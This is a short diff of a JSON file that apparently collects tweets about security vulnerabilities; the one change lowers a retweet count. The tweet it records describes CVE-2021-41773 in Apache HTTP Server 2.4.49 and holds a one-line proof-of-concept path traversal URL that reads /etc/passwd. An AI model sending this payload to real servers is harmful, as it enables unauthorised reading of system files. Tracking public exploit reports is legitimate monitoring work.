@@ -877,7 +877,7 @@
     "tweetfavorites": 198,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 70,
+    "tweetretweets": 69,
     "tweettext": "CVE-2021-41773: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack ...\nhttps://t.co/bhoEa1YUcC\n\nPoC\n127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
     "tweettime": "2021-10-05, 15:57:55",
     "tweeturl": "https://twitter.com/cyber_advising/status/1445417980305854468",
